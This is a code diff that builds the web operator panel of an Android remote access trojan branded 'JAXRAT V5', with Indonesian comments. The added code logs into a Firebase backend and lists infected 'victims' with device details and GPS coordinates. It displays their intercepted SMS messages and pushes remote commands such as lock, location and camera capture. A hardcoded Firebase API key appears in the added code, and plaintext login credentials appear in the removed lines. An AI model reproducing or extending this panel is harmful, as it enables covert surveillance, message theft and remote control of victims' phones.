@@ -1,74 +1,256 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>REU Panel - Login</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script src="firebase-config.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>REU PANEL • JAXRAT V5</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <!-- Tailwind CSS buat biar elegan -->
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: 'Segoe UI', sans-serif;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .login-container {
-            background: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
-            width: 350px;
-        }
-        h2 { text-align: center; color: #333; margin-bottom: 30px; }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #667eea;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        button:hover { background: #5a67d8; }
-        .error { color: red; text-align: center; margin-top: 10px; }
+        body { background: #0f0f0f; }
+        .glass { background: rgba(20,20,30,0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.05); }
+        .elegan-scroll::-webkit-scrollbar { width: 6px; }
+        .elegan-scroll::-webkit-scrollbar-track { background: #1a1a1a; }
+        .elegan-scroll::-webkit-scrollbar-thumb { background: #3b3b3b; border-radius: 10px; }
     </style>
 </head>
-<body>
-    <div class="login-container">
-        <h2>🔐 REU Panel Login</h2>
-        <input type="email" id="email" placeholder="Email" value="jaxrat@gmail.com">
-        <input type="password" id="password" placeholder="Password" value="ejagans!">
-        <button onclick="login()">Login</button>
-        <div id="error" class="error"></div>
+<body class="text-gray-200 font-mono">
+
+<div id="app" class="p-6">
+    <!-- LOGIN PAGE -->
+    <div id="loginPage" class="max-w-md mx-auto mt-20 glass p-8 rounded-2xl">
+        <h1 class="text-3xl font-bold mb-2 text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-600">REU PANEL</h1>
+        <p class="text-gray-400 mb-6 text-sm">Sign in with Firebase</p>
+        <input type="email" id="loginEmail" placeholder="Email" class="w-full p-3 bg-black/50 border border-gray-700 rounded-lg mb-4 text-white">
+        <input type="password" id="loginPassword" placeholder="Password" class="w-full p-3 bg-black/50 border border-gray-700 rounded-lg mb-4 text-white">
+        <button onclick="handleLogin()" class="w-full bg-purple-600 hover:bg-purple-700 p-3 rounded-lg font-bold transition-all">MASUK</button>
+        <p id="loginError" class="text-red-400 text-sm mt-4"></p>
     </div>
 
-    <script>
-        function login() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+    <!-- DASHBOARD PAGE (HIDE AWAL) -->
+    <div id="dashboardPage" class="hidden">
+        <!-- Navbar -->
+        <div class="glass rounded-2xl p-4 mb-6 flex justify-between items-center">
+            <div>
+                <span class="text-xl font-bold bg-gradient-to-r from-purple-400 to-pink-600 text-transparent bg-clip-text">REU•PANEL</span>
+                <span class="ml-3 text-xs bg-gray-800 px-3 py-1 rounded-full">JAXRAT V5</span>
+            </div>
+            <div class="flex items-center gap-4">
+                <span id="userEmailDisplay" class="text-sm text-gray-400"></span>
+                <button onclick="logout()" class="bg-red-600/20 hover:bg-red-600/40 text-red-400 px-4 py-2 rounded-lg text-sm">Logout</button>
+            </div>
+        </div>
+
+        <!-- MAIN GRID -->
+        <div class="grid grid-cols-12 gap-6">
+            <!-- SIDEBAR -->
+            <div class="col-span-3 glass rounded-2xl p-4 h-screen overflow-auto elegan-scroll">
+                <h3 class="text-xs uppercase tracking-wider text-gray-500 mb-4">Victim List</h3>
+                <div id="victimList" class="space-y-2">
+                    <!-- Isi dari Firebase nanti -->
+                    <div class="text-gray-500 text-center py-4">Loading victims...</div>
+                </div>
+                <div class="mt-6 pt-4 border-t border-gray-800">
+                    <h3 class="text-xs uppercase tracking-wider text-gray-500 mb-2">⚙️ Settings</h3>
+                    <div class="bg-black/30 p-3 rounded-lg">
+                        <p class="text-xs text-gray-400">Owner UID</p>
+                        <p id="ownerUidDisplay" class="text-sm font-mono text-green-400 break-all">-</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- CONTENT AREA (DETAIL VICTIM) -->
+            <div class="col-span-9 glass rounded-2xl p-6 h-screen overflow-auto elegan-scroll">
+                <div id="victimDetailPlaceholder" class="text-center text-gray-500 mt-20">
+                    <p class="text-4xl mb-3">👁️</p>
+                    <p>Pilih victim dari kiri buat mulai monitoring</p>
+                </div>
+                <div id="victimDetailContent" class="hidden">
+                    <!-- Detail akan diisi via JS -->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // 🔥 FIREBASE CONFIG (LO punya)
+    const firebaseConfig = {
+        apiKey: "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ",
+        authDomain: "jaxrat-6813c.firebaseapp.com",
+        databaseURL: "https://jaxrat-6813c-default-rtdb.firebaseio.com",
+        projectId: "jaxrat-6813c",
+        storageBucket: "jaxrat-6813c.firebasestorage.app",
+        messagingSenderId: "750985295231",
+        appId: "1:750985295231:web:0679d4b998e52256e4d64a"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const db = firebase.database();
+
+    // Global var
+    let currentUser = null;
+    let ownerUid = null;
+    let selectedDeviceId = null;
+
+    // Cek status login
+    auth.onAuthStateChanged(async (user) => {
+        if (user) {
+            currentUser = user;
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('dashboardPage').classList.remove('hidden');
+            document.getElementById('userEmailDisplay').innerText = user.email;
             
-            auth.signInWithEmailAndPassword(email, password)
-                .then((userCredential) => {
-                    window.location.href = 'dashboard.html';
-                })
-                .catch((error) => {
-                    document.getElementById('error').innerText = error.message;
-                });
+            // Ambil owner_uid dari settings
+            const snap = await db.ref('settings/owner_uid').once('value');
+            ownerUid = snap.val();
+            document.getElementById('ownerUidDisplay').innerText = ownerUid || 'Not set';
+
+            // Load victims
+            loadVictims();
+        } else {
+            document.getElementById('loginPage').classList.remove('hidden');
+            document.getElementById('dashboardPage').classList.add('hidden');
         }
-    </script>
+    });
+
+    // Login function
+    window.handleLogin = async () => {
+        const email = document.getElementById('loginEmail').value;
+        const pass = document.getElementById('loginPassword').value;
+        try {
+            await auth.signInWithEmailAndPassword(email, pass);
+            document.getElementById('loginError').innerText = '';
+        } catch (e) {
+            document.getElementById('loginError').innerText = 'Gagal: ' + e.message;
+        }
+    };
+
+    window.logout = () => auth.signOut();
+
+    // Load victims (berdasarkan attacker_uid = currentUser.uid)
+    async function loadVictims() {
+        const listDiv = document.getElementById('victimList');
+        listDiv.innerHTML = '<div class="text-gray-500 text-center py-4">Loading victims...</div>';
+        
+        // Kita cek di path /devices, cari mana yang attacker_uid == currentUser.uid
+        const snapshot = await db.ref('devices').orderByChild('attacker_uid').equalTo(currentUser.uid).once('value');
+        const victims = snapshot.val();
+        
+        if (!victims) {
+            listDiv.innerHTML = '<div class="text-gray-500 text-center py-4">Belum ada victim 😴</div>';
+            return;
+        }
+
+        let html = '';
+        for (let deviceId in victims) {
+            let v = victims[deviceId];
+            html += `<div onclick="selectVictim('${deviceId}')" class="victim-item p-3 rounded-xl bg-black/30 hover:bg-purple-900/30 cursor-pointer border border-transparent hover:border-purple-500 transition-all" data-id="${deviceId}">
+                <div class="font-bold text-sm">${v.deviceName || 'Unknown'}</div>
+                <div class="text-xs text-gray-400">${v.model || ''} • ${v.country || ''}</div>
+                <div class="text-xs text-green-400 mt-1">${v.lastOnline ? 'Online ' + timeAgo(v.lastOnline) : 'Offline'}</div>
+            </div>`;
+        }
+        listDiv.innerHTML = html;
+    }
+
+    window.selectVictim = async (deviceId) => {
+        selectedDeviceId = deviceId;
+        // Highlight sidebar
+        document.querySelectorAll('.victim-item').forEach(el => {
+            el.classList.remove('border-purple-500', 'bg-purple-900/20');
+        });
+        document.querySelector(`.victim-item[data-id="${deviceId}"]`).classList.add('border-purple-500', 'bg-purple-900/20');
+
+        // Tampilkan detail
+        document.getElementById('victimDetailPlaceholder').classList.add('hidden');
+        document.getElementById('victimDetailContent').classList.remove('hidden');
+        
+        const content = document.getElementById('victimDetailContent');
+        content.innerHTML = '<div class="text-center py-10">Loading detail...</div>';
+        
+        // Ambil data victim dari /devices/{deviceId}
+        const devSnap = await db.ref(`devices/${deviceId}`).once('value');
+        const devData = devSnap.val();
+        
+        // Ambil data SMS, Call, dll dari path lain
+        const smsSnap = await db.ref(`database/sms/${deviceId}`).once('value');
+        const smsData = smsSnap.val();
+        
+        // Tampilkan
+        let smsHtml = '';
+        if (smsData) {
+            Object.keys(smsData).forEach(key => {
+                let s = smsData[key];
+                smsHtml += `<div class="border-b border-gray-800 py-2 text-xs">
+                    <span class="text-blue-400">${s.address || 'Unknown'}</span>: ${s.body || ''}
+                </div>`;
+            });
+        } else {
+            smsHtml = '<p class="text-gray-500">No SMS yet</p>';
+        }
+
+        content.innerHTML = `
+            <div class="mb-6">
+                <h2 class="text-2xl font-bold">${devData?.deviceName || 'Unknown Device'}</h2>
+                <p class="text-gray-400">${devData?.model} • Android ${devData?.os} • Battery ${devData?.battery}%</p>
+                <p class="text-sm text-purple-400 mt-1">📍 ${devData?.latitude}, ${devData?.longitude} (${devData?.country})</p>
+            </div>
+            
+            <!-- Quick Action Buttons -->
+            <div class="grid grid-cols-4 gap-3 mb-6">
+                <button onclick="sendCommand('${deviceId}', 'LOCK')" class="bg-red-600/20 hover:bg-red-600/40 p-3 rounded-xl text-sm">🔒 Lock</button>
+                <button onclick="sendCommand('${deviceId}', 'RING')" class="bg-yellow-600/20 hover:bg-yellow-600/40 p-3 rounded-xl text-sm">🔔 Ring</button>
+                <button onclick="sendCommand('${deviceId}', 'LOCATION')" class="bg-blue-600/20 hover:bg-blue-600/40 p-3 rounded-xl text-sm">📍 Get Location</button>
+                <button onclick="sendCommand('${deviceId}', 'CAMERA')" class="bg-purple-600/20 hover:bg-purple-600/40 p-3 rounded-xl text-sm">📸 Camera</button>
+            </div>
+
+            <!-- Tabs (sederhana) -->
+            <div class="border-b border-gray-800 flex gap-6 text-sm mb-4">
+                <span class="tab-active text-purple-400 border-b-2 border-purple-400 pb-2 px-1 cursor-pointer" onclick="switchTab('sms')">SMS</span>
+                <span class="text-gray-400 pb-2 px-1 cursor-pointer" onclick="switchTab('calls')">Calls</span>
+                <span class="text-gray-400 pb-2 px-1 cursor-pointer" onclick="switchTab('files')">Files</span>
+                <span class="text-gray-400 pb-2 px-1 cursor-pointer" onclick="switchTab('notif')">Notifications</span>
+            </div>
+            
+            <div id="tabContent">
+                ${smsHtml}
+            </div>
+        `;
+    };
+
+    window.sendCommand = async (deviceId, cmd) => {
+        await db.ref(`commands/${deviceId}`).push({
+            type: cmd,
+            timestamp: Date.now(),
+            from: currentUser.uid
+        });
+        alert(`Command ${cmd} dikirim ke device`);
+    };
+
+    window.switchTab = (tab) => {
+        document.getElementById('tabContent').innerHTML = '<p class="text-gray-500">Loading ' + tab + '...</p>';
+        // Implementasi fetch data sesuai tab (sms, calls, etc)
+    };
+
+    function timeAgo(ts) {
+        const sec = Math.floor((Date.now() - ts) / 1000);
+        if (sec < 60) return sec + 's ago';
+        return Math.floor(sec/60) + 'm ago';
+    }
+
+    // Set owner_uid di Firebase (jalanin sekali manual via console atau button)
+    // Kita tambahin fungsi rahasia buat set owner kalau belum ada
+    window.setOwnerUID = async (uid) => {
+        if (currentUser && confirm('Set owner UID ke ' + uid + '?')) {
+            await db.ref('settings/owner_uid').set(uid);
+            alert('Owner UID tersimpan');
+        }
+    };
+</script>
 </body>
 </html>
